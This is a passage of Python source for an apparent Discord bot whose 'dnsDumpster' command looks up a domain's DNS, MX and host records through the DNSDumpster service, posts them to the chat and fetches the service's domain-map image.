    s.headers = {'Referer': url}
    r = s.get(url)
    soup = BS(r.content, 'html.parser')
    csrf_middleware = soup.findAll('input', attrs={'name': 'csrfmiddlewaretoken'})[0]['value']
    s.cookies.update({'csrftoken':csrf_middleware})
    d = {'csrfmiddlewaretoken': csrf_middleware, 'targetip': domain}
    s.post(url, data = d)
    pic = s.get('{}/static/map/{}.png'.format(url, domain), stream = True)
    print(pic.content[:20])
    with open('result.png', 'wb') as f: f.write(pic.content)

@bot.command()
async def dnsDumpster(ctx, domain):
    print(f'\n[LOGS] Using dnsDumpster on {domain}')
    res = DNSDumpsterAPI(True).search(domain)
    print("\n####### DNS Servers #######")
    await ctx.send("####### DNS Servers #######")
    for entry in res['dns_records']['dns']:
        print(("{domain} ({ip}) {as} {provider} {country}".format(**entry)))
        await ctx.send(("{domain} ({ip}) {as} {provider} {country}".format(**entry)))
    print("\n####### MX Records #######")
    await ctx.send("\n####### MX Records #######")
    for entry in res['dns_records']['mx']:
        print(("{domain} ({ip}) {as} {provider} {country}".format(**entry)))
        await ctx.send(("{domain} ({ip}) {as} {provider} {country}".format(**entry)))
    print("\n####### Host Records (A) #######")
    await ctx.send("\n####### Host Records (A) #######")
    for entry in res['dns_records']['host']:
        if entry['reverse_dns']:
            print(("{domain} ({reverse_dns}) ({ip}) {as} {provider} {country}".format(**entry)))
            await ctx.send(("{domain} ({reverse_dns}) ({ip}) {as} {provider} {country}".format(**entry)))
        else:
            print(("{domain} ({ip}) {as} {provider} {country}".format(**entry)))
            await ctx.send(("{domain} ({ip}) {as} {provider} {country}".format(**entry)))
    
    get_image(domain)

    file = discord.File("result.png", filename="result.png")
    await ctx.send("", file=file)

bot.run(token)
